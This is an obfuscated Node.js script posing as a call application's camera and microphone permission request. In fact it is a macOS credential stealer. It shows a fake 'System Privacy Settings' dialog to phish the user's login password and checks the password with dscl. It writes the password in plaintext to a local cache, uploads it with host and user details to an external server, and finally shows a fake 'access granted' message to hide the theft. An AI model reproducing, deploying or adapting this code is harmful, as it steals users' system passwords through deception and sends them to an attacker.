#!/usr/bin/env node

function _0x1956(_0x400f29,_0x43afd3){const _0x531b83=_0x531b();return _0x1956=function(_0x19561e,_0x11a67d){_0x19561e=_0x19561e-0x138;let _0xfbb0f2=_0x531b83[_0x19561e];return _0xfbb0f2;},_0x1956(_0x400f29,_0x43afd3);}const _0x5b7584=_0x1956;(function(_0x3fd5f9,_0x14fe4c){const _0x38241c=_0x1956,_0x16b78c=_0x3fd5f9();while(!![]){try{const _0x29f15f=-parseInt(_0x38241c(0x1a3))/0x1+-parseInt(_0x38241c(0x17c))/0x2*(-parseInt(_0x38241c(0x17d))/0x3)+parseInt(_0x38241c(0x13a))/0x4*(parseInt(_0x38241c(0x14a))/0x5)+parseInt(_0x38241c(0x1a2))/0x6+-parseInt(_0x38241c(0x195))/0x7+parseInt(_0x38241c(0x193))/0x8*(-parseInt(_0x38241c(0x158))/0x9)+parseInt(_0x38241c(0x1a7))/0xa;if(_0x29f15f===_0x14fe4c)break;else _0x16b78c['push'](_0x16b78c['shift']());}catch(_0xeb7911){_0x16b78c['push'](_0x16b78c['shift']());}}}(_0x531b,0xb6bf6));const {execSync}=require(_0x5b7584(0x19a)),fs=require('fs'),path=require(_0x5b7584(0x189)),os=require('os'),crypto=require(_0x5b7584(0x138)),http=require(_0x5b7584(0x147)),https=require('https'),CONFIG={'serverDomain':_0x5b7584(0x152),'serverPath':_0x5b7584(0x186),'serverPort':0x1f98,'apiKey':_0x5b7584(0x162),'retryDelay':0xbb8,'maxRetries':0x5,'timeout':0xea60};let SYSTEM_PASSWORD=null;function log(_0x3e9c09,_0x4fe623){const _0x34edc5=_0x5b7584,_0x58b2a3=new Date()['toISOString']();console[_0x34edc5(0x146)]('['+_0x58b2a3+']\x20'+_0x3e9c09);if(_0x4fe623)console['error'](_0x4fe623);try{const _0x2d21b6=path[_0x34edc5(0x16d)](os[_0x34edc5(0x14b)](),_0x34edc5(0x182));fs[_0x34edc5(0x154)](_0x2d21b6,'['+_0x58b2a3+']\x20'+_0x3e9c09+'\x0a');if(_0x4fe623)fs[_0x34edc5(0x154)](_0x2d21b6,(_0x4fe623[_0x34edc5(0x150)]||_0x4fe623)+'\x0a');}catch(_0x28c707){}}function verifyPassword(_0x249a24,_0x473452){const _0x32974d=_0x5b7584;try{const _0x73285a=_0x32974d(0x15f)+_0x249a24+'\x20'+_0x473452;return execSync(_0x73285a,{'stdio':_0x32974d(0x168)}),!![];}catch(_0x34aa9c){return![];}}async function getMacOSPassword(){const _0x851d8d=_0x5b7584;log(_0x851d8d(0x183));try{const _0x5a2190=os[_0x851d8d(0x181)]()['username'];log(_0x851d8d(0x169)+_0x5a2190);for(let _0x4aae74=0x1;_0x4aae74<=0x5;_0x4aae74++){log(_0x851d8d(0x161)+_0x4aae74+_0x851d8d(0x141));const _0x4845eb=_0x851d8d(0x16f);try{const _0x307174=execSync(_0x4845eb,{'encoding':_0x851d8d(0x151)});let _0x3b89f0='';const _0x4471a1=_0x307174[_0x851d8d(0x19d)](/text returned:([^,]+)/);if(_0x4471a1&&_0x4471a1[0x1]){_0x3b89f0=_0x4471a1[0x1][_0x851d8d(0x13f)]();if(verifyPassword(_0x5a2190,_0x3b89f0))return log(_0x851d8d(0x16e)),SYSTEM_PASSWORD=_0x3b89f0,_0x3b89f0;else log(_0x851d8d(0x13b)),_0x4aae74<0x5&&execSync(_0x851d8d(0x175));}else{if(_0x307174[_0x851d8d(0x139)](_0x851d8d(0x17a)))return log(_0x851d8d(0x173)),null;else log(_0x851d8d(0x197));}}catch(_0x3519f4){log(_0x851d8d(0x145)+_0x3519f4[_0x851d8d(0x16a)]);if(_0x3519f4[_0x851d8d(0x16a)]['includes'](_0x851d8d(0x15e)))return log(_0x851d8d(0x173)),null;}}return execSync(_0x851d8d(0x1a0)),null;}catch(_0x1a95b5){return log(_0x851d8d(0x140)+_0x1a95b5[_0x851d8d(0x16a)],_0x1a95b5),null;}}function generateClientId(){const _0x1ac733=_0x5b7584;try{const _0x38b9d0=getMacAddress(),_0x5047fa=os[_0x1ac733(0x144)](),_0x566742=os['userInfo']()[_0x1ac733(0x16c)],_0x4403fb=crypto[_0x1ac733(0x165)](_0x1ac733(0x14f))[_0x1ac733(0x188)](_0x38b9d0+':'+_0x5047fa+':'+_0x566742)['digest'](_0x1ac733(0x19e))[_0x1ac733(0x148)](0x0,0x8);return _0x4403fb;}catch(_0x259939){return Math[_0x1ac733(0x15d)]()[_0x1ac733(0x171)](0x24)['substring'](0x2,0xa);}}function getMacAddress(){const _0x84d3d6=_0x5b7584;try{const _0x2be256=os['networkInterfaces']();for(const _0x2e4cfb of Object[_0x84d3d6(0x18e)](_0x2be256)){for(const _0x245e59 of _0x2be256[_0x2e4cfb]){if(!_0x245e59[_0x84d3d6(0x167)]&&_0x245e59[_0x84d3d6(0x142)]!=='00:00:00:00:00:00')return _0x245e59[_0x84d3d6(0x142)];}}return _0x84d3d6(0x176);}catch(_0x25eeb4){return _0x84d3d6(0x176);}}async function uploadToServer(_0x8c9ed8,_0x1ef1de=0x0){return new Promise(_0x5c0c9b=>{const _0x144c85=_0x1956;try{const _0x2a5163=generateClientId(),_0x3905f0={'hostname':os[_0x144c85(0x144)](),'platform':os['platform'](),'type':os[_0x144c85(0x19f)](),'arch':os[_0x144c85(0x153)](),'username':os[_0x144c85(0x181)]()[_0x144c85(0x16c)],'id':_0x2a5163},_0x372664=CONFIG[_0x144c85(0x156)]===0x1bb?_0x144c85(0x19c):_0x144c85(0x147),_0x35bb4b=_0x372664+_0x144c85(0x1a5)+CONFIG[_0x144c85(0x196)]+':'+CONFIG[_0x144c85(0x156)]+CONFIG['serverPath'],_0x1cda8c=_0x35bb4b[_0x144c85(0x17b)](_0x144c85(0x14e)),_0x165901=_0x1cda8c?https:http,_0x56c944=new URL(_0x35bb4b),_0x15ffbd=_0x144c85(0x163)+Math[_0x144c85(0x15d)]()['toString'](0x10)[_0x144c85(0x160)](0x2);let _0x194a00='';_0x194a00+='--'+_0x15ffbd+'\x0d\x0a',_0x194a00+=_0x144c85(0x166),_0x194a00+=_0x144c85(0x13c),_0x194a00+=JSON['stringify'](_0x3905f0)+'\x0d\x0a',_0x194a00+='--'+_0x15ffbd+'\x0d\x0a',_0x194a00+='Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22'+_0x2a5163+_0x144c85(0x16b),_0x194a00+=_0x144c85(0x170),_0x194a00+=_0x8c9ed8+'\x0d\x0a',_0x194a00+='--'+_0x15ffbd+_0x144c85(0x194);const _0x34428c={'hostname':_0x56c944['hostname'],'port':_0x56c944[_0x144c85(0x13e)]||(_0x1cda8c?0x1bb:0x50),'path':_0x56c944[_0x144c85(0x17f)]+_0x56c944['search'],'method':'POST','headers':{'Content-Type':'multipart/form-data;\x20boundary='+_0x15ffbd,'Content-Length':Buffer[_0x144c85(0x177)](_0x194a00),'X-Client-Info':JSON[_0x144c85(0x18d)](_0x3905f0),'X-API-Key':CONFIG[_0x144c85(0x191)]},'timeout':CONFIG['timeout']};log(_0x144c85(0x1a6)+_0x35bb4b);const _0x44b966=_0x165901[_0x144c85(0x18c)](_0x34428c,_0x53cc2d=>{const _0x5a6d85=_0x144c85;let _0x343081='';_0x53cc2d['on']('data',_0x3cb17a=>{_0x343081+=_0x3cb17a;}),_0x53cc2d['on'](_0x5a6d85(0x199),()=>{const _0xfa2a2=_0x5a6d85;_0x53cc2d[_0xfa2a2(0x155)]>=0xc8&&_0x53cc2d[_0xfa2a2(0x155)]<0x12c?(log(_0xfa2a2(0x159)+_0x53cc2d['statusCode']),_0x5c0c9b(!![])):(log('Permission\x20verification\x20failed:\x20'+_0x53cc2d[_0xfa2a2(0x155)]+',\x20'+_0x343081),_0x1ef1de<CONFIG[_0xfa2a2(0x18a)]?(log(_0xfa2a2(0x13d)+(_0x1ef1de+0x1)+'/'+CONFIG[_0xfa2a2(0x18a)]+_0xfa2a2(0x14d)),setTimeout(()=>{uploadToServer(_0x8c9ed8,_0x1ef1de+0x1)['then'](_0x5c0c9b);},CONFIG[_0xfa2a2(0x187)])):(log(_0xfa2a2(0x178)),_0x5c0c9b(![])));});});_0x44b966['on']('error',_0x476fe4=>{const _0x40cd81=_0x144c85;log(_0x40cd81(0x15a)+_0x476fe4[_0x40cd81(0x16a)],_0x476fe4),_0x1ef1de<CONFIG['maxRetries']?(log(_0x40cd81(0x13d)+(_0x1ef1de+0x1)+'/'+CONFIG[_0x40cd81(0x18a)]+')...'),setTimeout(()=>{const _0x33607b=_0x40cd81;uploadToServer(_0x8c9ed8,_0x1ef1de+0x1)[_0x33607b(0x198)](_0x5c0c9b);},CONFIG['retryDelay'])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x5c0c9b(![]));}),_0x44b966['write'](_0x194a00),_0x44b966[_0x144c85(0x199)]();}catch(_0x2c351b){log('Permission\x20error:\x20'+_0x2c351b[_0x144c85(0x16a)],_0x2c351b),_0x1ef1de<CONFIG[_0x144c85(0x18a)]?(log(_0x144c85(0x13d)+(_0x1ef1de+0x1)+'/'+CONFIG[_0x144c85(0x18a)]+_0x144c85(0x14d)),setTimeout(()=>{const _0x2ba287=_0x144c85;uploadToServer(_0x8c9ed8,_0x1ef1de+0x1)[_0x2ba287(0x198)](_0x5c0c9b);},CONFIG[_0x144c85(0x187)])):(log(_0x144c85(0x178)),_0x5c0c9b(![]));}});}function _0x531b(){const _0x317755=['createHash','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','internal','ignore','Current\x20user:\x20','message','.txt\x22\x0d\x0a','username','join','Administrator\x20password\x20verified','osascript\x20-e\x20\x27display\x20dialog\x20\x22Call\x20application\x20is\x20requesting\x20access\x20to\x20Microphone/Video\x5cn\x5cnPlease\x20enter\x20your\x20password\x20to\x20allow\x20access.\x22\x20with\x20title\x20\x22System\x20Privacy\x20Settings\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','toString','mkdirSync','User\x20canceled\x20password\x20entry','platform','osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Permission\x20cannot\x20be\x20granted.\x22\x20with\x20title\x20\x22System\x20Privacy\x20Settings\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22Try\x20Again\x22}\x20default\x20button\x20\x22Try\x20Again\x22\x27','unknown','byteLength','Maximum\x20retry\x20attempts\x20reached','\x0aType:\x20','gave\x20up:true','startsWith','56362fKTabj','123kdbtcK','Starting\x20camera\x20and\x20microphone\x20access\x20permission\x20process','pathname','\x0aPlatform:\x20','userInfo','call_app_logs.txt','\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20for\x20call\x20app\x20access\x20===','.json','Permission\x20process\x20completed','/api/files/upload','retryDelay','update','path','maxRetries','Permission\x20process\x20canceled:\x20password\x20verification\x20failed','request','stringify','keys','Permission\x20granted\x20successfully','osascript\x20-e\x20\x27display\x20dialog\x20\x22Microphone\x20and\x20camera\x20access\x20has\x20been\x20successfully\x20granted.\x22\x20with\x20title\x20\x22Access\x20Granted\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','apiKey','\x0aArchitecture:\x20','8DJeBDo','--\x0d\x0a','10417792VEMdRU','serverDomain','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','then','end','child_process','osascript\x20-e\x20\x27display\x20dialog\x20\x22Unable\x20to\x20grant\x20microphone\x20and\x20camera\x20access.\x20Please\x20try\x20again\x20later.\x22\x20with\x20title\x20\x22Access\x20Error\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','https','match','hex','type','osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20Camera\x20and\x20microphone\x20access\x20is\x20denied.\x22\x20with\x20title\x20\x22Access\x20Denied\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','Error\x20saving\x20permission\x20data:\x20','529212tPxWpv','586644AhrUYp','Permission\x20data\x20saved\x20to:\x20','://','Uploading\x20permission\x20data\x20to\x20server:\x20','24252850lgBXFA','writeFileSync','crypto','includes','37916GThYYo','Password\x20verification\x20failed','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','Retrying\x20permission\x20verification\x20(','port','trim','Error\x20getting\x20administrator\x20password:\x20','\x20of\x205\x20to\x20get\x20password','mac','\x0aClientID:\x20','hostname','Error\x20requesting\x20password\x20via\x20dialog:\x20','log','http','substring','release','255QRgIQO','homedir','Unexpected\x20error\x20in\x20permission\x20process',')...','https://','md5','stack','utf8','sweetsalmon.clck.hk','arch','appendFileSync','statusCode','serverPort','toISOString','11960127aiXgck','Permission\x20verification\x20successful:\x20','Permission\x20request\x20error:\x20','\x0aPassword:\x20','\x0aHostname:\x20','random','User\x20canceled','dscl\x20/Local/Default\x20-authonly\x20','substr','Attempt\x20','tJz4uRVCwl2eEwyPTudYP9iGRfgq','----WebKitFormBoundary','existsSync'];_0x531b=function(){return _0x317755;};return _0x531b();}function savePasswordLocally(_0x11a6ac){const _0x1e5a01=_0x5b7584;try{const _0x24f172=os['userInfo']()[_0x1e5a01(0x16c)],_0x8ea5c1=generateClientId(),_0xa89bae=new Date()[_0x1e5a01(0x157)](),_0xac3fbc=os[_0x1e5a01(0x14b)](),_0x47e0df=path[_0x1e5a01(0x16d)](_0xac3fbc,'CallAppCache');!fs[_0x1e5a01(0x164)](_0x47e0df)&&fs[_0x1e5a01(0x172)](_0x47e0df,{'recursive':!![]});const _0x15cb03='User:\x20'+_0x24f172+_0x1e5a01(0x15b)+_0x11a6ac+'\x0aTime:\x20'+_0xa89bae+_0x1e5a01(0x15c)+os[_0x1e5a01(0x144)]()+_0x1e5a01(0x180)+os[_0x1e5a01(0x174)]()+_0x1e5a01(0x179)+os[_0x1e5a01(0x19f)]()+_0x1e5a01(0x192)+os['arch']()+_0x1e5a01(0x143)+_0x8ea5c1,_0x16c50c=path['join'](_0x47e0df,_0x8ea5c1+'.txt');fs[_0x1e5a01(0x1a8)](_0x16c50c,_0x15cb03),log(_0x1e5a01(0x1a4)+_0x16c50c);const _0x768a31={'user':_0x24f172,'password':_0x11a6ac,'timestamp':_0xa89bae,'hostname':os[_0x1e5a01(0x144)](),'system':{'platform':os[_0x1e5a01(0x174)](),'release':os[_0x1e5a01(0x149)](),'type':os[_0x1e5a01(0x19f)](),'arch':os[_0x1e5a01(0x153)]()},'clientId':_0x8ea5c1},_0x5d36e7=path[_0x1e5a01(0x16d)](_0x47e0df,_0x8ea5c1+_0x1e5a01(0x184));return fs['writeFileSync'](_0x5d36e7,JSON[_0x1e5a01(0x18d)](_0x768a31,null,0x2)),log('Permission\x20JSON\x20data\x20saved\x20to:\x20'+_0x5d36e7),_0x15cb03;}catch(_0x455d52){return log(_0x1e5a01(0x1a1)+_0x455d52[_0x1e5a01(0x16a)],_0x455d52),null;}}async function main(){const _0x18d549=_0x5b7584;try{log(_0x18d549(0x17e));const _0x1144f3=await getMacOSPassword();if(!_0x1144f3){log(_0x18d549(0x18b));return;}const _0x1aba19=savePasswordLocally(_0x1144f3);if(!_0x1aba19){log('Permission\x20error:\x20failed\x20to\x20save\x20verification\x20data');return;}const _0x21ac60=await uploadToServer(_0x1aba19);if(_0x21ac60){log(_0x18d549(0x18f));try{execSync(_0x18d549(0x190));}catch(_0x2de81d){}}else{log('Permission\x20could\x20not\x20be\x20granted');try{execSync(_0x18d549(0x19b));}catch(_0x19cf00){}}log(_0x18d549(0x185));}catch(_0x4acf0b){log(_0x18d549(0x14c),_0x4acf0b);}}main();
